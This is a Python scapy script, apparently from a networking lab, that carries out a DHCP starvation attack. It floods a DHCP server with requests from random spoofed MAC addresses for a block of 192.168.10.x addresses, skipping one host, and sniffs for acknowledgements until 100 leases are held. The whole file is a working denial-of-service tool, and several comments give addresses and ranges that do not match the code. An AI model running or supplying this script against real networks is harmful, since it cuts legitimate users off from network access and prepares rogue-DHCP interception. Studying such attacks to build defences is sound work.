from scapy.all import *
from time import sleep
from threading import Thread

class DHCPStarvation(object):
    def __init__(self):
        # MAC addresses generated to avoid duplicates
        self.mac = [""]
        # Requested IP addresses stored to identify registered IP
        self.ip = []

    # Method to handle DHCP ACK packets
    def handle_dhcp(self, pkt):
        if pkt[DHCP]:
            # If DHCP server replies ACK, the IP address requested is registered
            # 10.10.111.107 is IP for bt5, not to be starved
            if pkt[DHCP].options[0][1] == 5 and pkt[IP].dst != "192.168.10.161":
                self.ip.append(pkt[IP].dst)
                print(str(pkt[IP].dst) + " registered")
            # Duplicate ACK may happen due to packet loss
            elif pkt[DHCP].options[0][1] == 6:
                print("NAK received")

    # Method to listen for DHCP packets
    def listen(self):
        # Sniff DHCP packets
        sniff(filter="udp and (port 67 or port 68)",
              prn=self.handle_dhcp,
              store=0)

    # Method to start DHCP starvation attack
    def start(self):
        # Start packet listening thread
        thread = Thread(target=self.listen)
        thread.start()
        print("Starting DHCP starvation...")
        # Keep starving until all 100 targets are registered
        # 100~200 excepts 107 = 100
        while len(self.ip) < 100:
            self.starve()
        print("Targeted IP address starved")

    # Method to send DHCP requests for certain IP in a loop
    def starve(self):
        for i in range(126):
            # 0->100
            # Don't request 10.10.111.107
            if i == 34:
                continue
            # Generate IP we want to request
            # If IP already registered, then skip, 128->253, 162
            requested_addr = "192.168.10." + str(128 + i)
            if requested_addr in self.ip:
                continue
            
            # Generate MAC, avoid duplication
            src_mac = ""
            while src_mac in self.mac:
                src_mac = RandMAC()
            self.mac.append(src_mac)
            # Generate DHCP request packet
            pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
            pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
            pkt /= UDP(sport=68, dport=67)
            pkt /= BOOTP(chaddr=RandString(12, "0123456789abcdef"))
            pkt /= DHCP(options=[("message-type", "request"),
                                 ("requested_addr", requested_addr),
                                 ("server_id", "192.168.10.1"),
                                 "end"])
            sendp(pkt)
            print("Trying to occupy " + requested_addr)
            sleep(0.2)  # Interval to avoid congestion and packet loss

if __name__ == "__main__":
    starvation = DHCPStarvation()
    starvation.start()
